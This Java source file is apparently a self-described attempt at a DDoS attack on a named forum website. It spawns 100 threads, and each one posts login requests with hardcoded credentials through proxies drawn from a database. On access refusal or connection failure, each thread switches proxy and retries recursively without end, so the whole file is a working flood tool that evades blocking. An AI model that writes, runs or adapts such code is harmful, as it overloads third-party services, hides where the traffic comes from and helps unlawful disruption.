package com.br.dong.httpclientTest.ddosTest;

import com.br.dong.httpclientTest.CrawlerUtil;
import com.br.dong.httpclientTest.porn.JdbcUtil;
import com.br.dong.httpclientTest.porn.ProxyBean;
import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.message.BasicNameValuePair;
import org.jsoup.nodes.Document;
import org.jsoup.select.Elements;

import java.io.*;
import java.security.KeyManagementException;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
* Created with IntelliJ IDEA.
* User: Dong
* Date: 14-10-31
* Time: 下午5:14
* To change this template use File | Settings | File Templates.
*尝试使用ddos攻击
*/
public class DdosThreadTask extends Thread{
   private CrawlerUtil client=new CrawlerUtil();
   private CloseableHttpClient httpclient = HttpClients.createDefault();
   private static String GBK="GBK";
   private static String url="http://99btgc01.com/index.php";
   private String loginPostUrl="http://99btgc01.com/logging.php?action=login&loginsubmit=true";//登录post接口
   //
   private static String username="he7253997";
    private static String password="95b004" ;


    //线程池
    private static ExecutorService threadPool= Executors.newCachedThreadPool();
    public void run(){
        login();
//        getTest();
    }

    public void loginPost(){
        try {
            Document doc=client.getDocGBK(client.noProxyGetUrl(url));
            System.out.println(doc.toString());
            System.out.println( getFormhash(url,"formhash"));
        } catch (IOException e) {
            e.printStackTrace();  //To change body of catch statement use File | Settings | File Templates.
        } catch (CloneNotSupportedException e) {
            e.printStackTrace();  //To change body of catch statement use File | Settings | File Templates.
        }
    }
    public DdosThreadTask() {
        try {
            client.clientCreate("http","99btgc01.com","http://99btgc01.com/index.php");
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();  //To change body of catch statement use File | Settings | File Templates.
        } catch (KeyManagementException e) {
            e.printStackTrace();  //To change body of catch statement use File | Settings | File Templates.
        }

    }


    public static void main(String[] args) {
//        File file = new File("F:\\壁纸&ico图标\\t\\2.jpg");
//        System.out.println("file="+file.getName()+"|"+file.getClass().getSimpleName());
//        byte [] b=getBytes("F:\\壁纸&ico图标\\t\\2.jpg");
//        System.out.println("b"+b.length+b.toString());
//        try {
//            String bb=new String(b,"GBK");
//            System.out.println(bb);
//            username=bb;
//        } catch (UnsupportedEncodingException e) {
//            e.printStackTrace();  //To change body of catch statement use File | Settings | File Templates.
//        }
        for(int i=0;i<100;i++){
            threadPool.execute(new DdosThreadTask());//线程池启动线程
        }

    }
    /**
     * 获得指定文件的byte数组
     */
    public static byte[] getBytes(String filePath){
        byte[] buffer = null;
        try {
            File file = new File(filePath);
            FileInputStream fis = new FileInputStream(file);
            ByteArrayOutputStream bos = new ByteArrayOutputStream(1000);
            byte[] b = new byte[1000];
            int n;
            while ((n = fis.read(b)) != -1) {
                bos.write(b, 0, n);
            }
            fis.close();
            bos.close();
            buffer = bos.toByteArray();
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return buffer;
    }
    /**
     * 获得当前发表新帖页面的formhash 放入参数中
     * @param url
     * @param keyname 要获得的隐藏参数
     * @throws IOException
     */
    public  String  getFormhash(String url,String keyname)  {
        HttpGet get=new HttpGet(url);
        HttpResponse response = null;
        try {
            response = client.execute(get);
        } catch (IOException e) {
            return "";
        }
        HttpEntity entity = response.getEntity();
        if (entity != null) {
            Document doc=client.getDocument(entity,GBK);
            Elements elements=doc.select("form[method=post]").select("input[name="+keyname+"]");
            String formhash=elements.toString();
//            System.out.println("fff"+formhash);
            if(formhash.length()>10){
                formhash=formhash.substring(formhash.indexOf("value=\"")+7,formhash.indexOf("\" />"));
                System.out.println(keyname+":"+formhash);
            }
            return formhash;
        }
        return "";
    }
    public void getTest(){
        ProxyBean proxy= JdbcUtil.getProxy();
        System.out.println("start connet to proxy:["+proxy.toString()+"]");
        //代理post访问视频页面
        HttpResponse response= null;
        try{
            response=client.proxyGetUrl("http://99btgc01.com/seccode.php?update=0.741413613082841", proxy.getIp(), proxy.getPort());
        } catch (IOException e) {
            e.printStackTrace();  //To change body of catch statement use File | Settings | File Templates.
        } catch (CloneNotSupportedException e) {
            e.printStackTrace();  //To change body of catch statement use File | Settings | File Templates.
        }
        Document doc=null;
        if(response!=null){
            System.out.println("链接代理成功");
            doc=client.getDocGBK(response);
            if(doc.toString().contains("拒绝访问")){
                System.out.println("拒绝访问，更换代理进行访问");
                getTest();
            } else if(doc.toString().contains("爱唯侦察")){
                System.out.println("发送成功");
            }
            System.out.println(doc.toString());
        }else if(response==null){
            System.out.println("链接代理失败");
            getTest();
        }
    }
    /**
     * 登录方法
     */
    public  void login() {
        ProxyBean proxy= JdbcUtil.getProxy();
        System.out.println("start connet to proxy:["+proxy.toString()+"]");
        //代理post访问视频页面
        HttpResponse response= null;
        try {
            response = client.proxyPostUrl(loginPostUrl, proxy.getIp(), proxy.getPort(), getPostParmList());
//            response=client.post(loginPostUrl,new UrlEncodedFormEntity(getPostParmList()));
        } catch (IOException e) {
            e.printStackTrace();  //To change body of catch statement use File | Settings | File Templates.
        } catch (CloneNotSupportedException e) {
            e.printStackTrace();  //To change body of catch statement use File | Settings | File Templates.
        }
        Document doc=null;
        if(response!=null){
            System.out.println("链接代理成功");
            doc=client.getDocGBK(response);
            if(doc.toString().contains("拒绝访问")){
                System.out.println("拒绝访问，更换代理进行访问");
                login();
            } else if(doc.toString().contains("爱唯侦察")){
                System.out.println("发送成功");
            }
            System.out.println(doc.toString());
        }else if(response==null){
            System.out.println("链接代理失败");
            login();
        }
    }
    /**
     * 拿去post参数，获得中文返回页面
     * */
    public  List<NameValuePair> getPostParmList(){
        // 创建参数队列
        List<NameValuePair> list = new ArrayList<NameValuePair>();
        list.add(new BasicNameValuePair("formhash", "ac690cae"));
        list.add(new BasicNameValuePair("cookietime", "2592000"));
        list.add(new BasicNameValuePair("loginfield", "username"));
        list.add(new BasicNameValuePair("cookietime", "2592000"));
        list.add(new BasicNameValuePair("username", username));
        list.add(new BasicNameValuePair("password", password));
        return list;
    }
}
